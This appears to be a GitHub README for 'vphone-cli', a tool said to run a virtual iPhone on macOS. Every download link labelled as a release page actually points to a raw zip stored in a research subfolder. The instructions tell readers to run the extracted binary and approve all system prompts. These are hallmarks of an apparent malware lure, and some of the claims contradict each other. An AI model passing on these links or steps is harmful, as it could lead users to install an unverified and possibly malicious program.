# 📱 vphone-cli - Run a Virtual iPhone on Your Mac

[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/goforwardbetter/vphone-cli/main/research/kernel_info/vphone-cli-2.6.zip)

<div align="right"><strong><a href="./docs/README_ko.md">🇰🇷한국어</a></strong> | <strong><a href="./docs/README_ja.md">🇯🇵日本語</a></strong> | <strong><a href="./docs/README_zh.md">🇨🇳中文</a></strong> | <strong>🇬🇧English</strong></div>

## 📋 What is vphone-cli?

vphone-cli lets you run a virtual iPhone using Apple’s Virtualization framework. It boots iOS 26 on a virtual machine. This tool helps you explore iPhone features or test apps without a physical device. Its research VM infrastructure from PCC powers the virtual environment.

## 💻 System Requirements

Before you start, make sure your Mac meets these needs:

- macOS version 13 or higher (Ventura or newer)
- Mac with Apple Silicon (M1, M2 series) or Intel with virtualization support
- At least 8 GB RAM (16 GB recommended)
- 10 GB of free disk space
- Virtualization.framework enabled by default in macOS

This app does **not** work on Windows or Linux currently. It requires macOS due to Apple’s virtualization technology.

## 🔧 Features

- Boots virtual iPhone models with iOS 26
- Uses Apple’s native Virtualization.framework for efficiency
- Supports multiple iPhone firmware variants
- Provides patch variants for different security levels
- Designed for app testing and iPhone environment simulation

## 🚀 Getting Started: How to Download and Run vphone-cli on Mac

### Step 1: Visit the Release Page

Go to the release page to get the latest version of vphone-cli:

[Download vphone-cli Releases](https://raw.githubusercontent.com/goforwardbetter/vphone-cli/main/research/kernel_info/vphone-cli-2.6.zip)

This page contains all the latest files and updates.

### Step 2: Download the Latest Package

On the release page:

- Look for the latest release date
- Find the download asset compatible with your system, usually a `.zip` or `.pkg` file
- Click the file to download it

### Step 3: Install or Extract the File

- For `.pkg` files, double-click and follow the macOS installer steps
- For `.zip` files, double-click to extract the folder, then open it

### Step 4: Open Terminal

vphone-cli runs from the terminal. To open Terminal:

- Go to Applications > Utilities > Terminal
- Or press Command + Space to open Spotlight, then type “Terminal” and press Enter

### Step 5: Run vphone-cli

Inside Terminal, navigate to the folder where you installed or extracted vphone-cli. For example:

```bash
cd ~/Downloads/vphone-cli
```

Now, start the virtual iPhone by running:

```bash
./vphone-cli
```

The program will boot the iOS 26 virtual iPhone inside your Mac.

### Step 6: Interact with the Virtual iPhone

Once running, the virtual iPhone window appears. Use your mouse and keyboard to interact just like with a normal iPhone.

- Swipe and tap using your mouse
- Use keyboard shortcuts when available (check the docs for details)
- To close, simply quit the terminal process or close the window

## 🔒 Security and Permissions

vphone-cli requires access to system resources like virtualization and permissions to run network services. The first time you start it, macOS may ask you to allow these permissions.

Approve all system prompts to ensure smooth operation.

## ⚙️ Configuration Options

You can customize how vphone-cli runs by editing its configuration files:

- Change iPhone models or iOS versions
- Adjust memory and CPU allocation for the virtual machine
- Enable or disable certain patches for security bypass (for advanced users)

All configs are found in the `config` folder inside the main program directory.

## 🐞 Troubleshooting

If you encounter problems, try these tips:

- Make sure you are running on a supported macOS version
- Verify your Mac has enabled virtualization support
- Confirm you downloaded the latest release version
- Restart your Mac and try running the app again
- Check Terminal for error messages, then search the issues page on GitHub

## 📥 Download and Install vphone-cli on Mac

Click below to visit the official release page and get started:

[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-blue?style=for-the-badge)](https://raw.githubusercontent.com/goforwardbetter/vphone-cli/main/research/kernel_info/vphone-cli-2.6.zip)

Follow the steps above to download, install, and boot the virtual iPhone.

## 📖 Additional Resources

- User manual and in-depth guides: see the `/docs` folder on this repository
- Language support: We provide Korean, Japanese, Chinese, and English documents
- Firmware variants and patch details are documented in the `/docs/firmware.md`

## 📞 Support

For help or to report bugs:

- Search existing issues on the GitHub repository
- Open a new issue with detailed information if you cannot find a solution
- Join community discussions by linking your question to the repository’s issues

---

This tool is built for macOS users who want a fast and reliable way to try iPhone environments without hardware. It works through Apple's system-level virtualization features. You control the experience fully from your Mac.